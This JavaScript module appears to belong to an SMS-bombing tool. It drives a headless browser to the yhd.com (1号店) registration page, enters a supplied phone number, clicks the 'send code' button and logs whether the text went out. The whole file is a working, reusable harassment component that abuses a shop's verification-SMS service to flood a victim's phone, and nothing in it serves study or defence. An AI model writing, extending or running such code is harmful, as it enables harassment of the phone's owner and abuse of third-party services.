const {
  log: {
    successlog,
    faillog,
  },
} = require('@new4/utils');

const Bomber = require('../Bomber');

class Bomb extends Bomber {
  constructor() {
    super({
      id: '1号店',
      url: 'https://passport.yhd.com/passport/register_input.do',
      phoneSelector: 'input#phone',
      sendButtonSelector: 'a.receive_code',
    });
  }

  async chaos(ctx) {
    const {
      id,
      url,
      phoneSelector,
      sendButtonSelector,
    } = this;

    const {
      phone,
      browser,
    } = ctx;

    const page = await browser.newPage();
    await page.goto(url);

    const [
      phoneInputElement,
      sendButtonElement,
    ] = await Promise.all([
      await page.$(phoneSelector),
      await page.$(sendButtonSelector),
    ]);

    await phoneInputElement.type(phone);
    await page.waitFor(200);
    await sendButtonElement.click(); // 为了使手机输入框失焦
    await page.waitFor(200);
    await sendButtonElement.click(); // 发送验证码

    // 检验是否发送成功
    if (/\(\d+\)/.test(sendButtonElement.innerText)) {
      successlog(`${id}`);
      await page.close();
    } else {
      faillog(`${id}`);
    }
  }
}

module.exports = new Bomb();
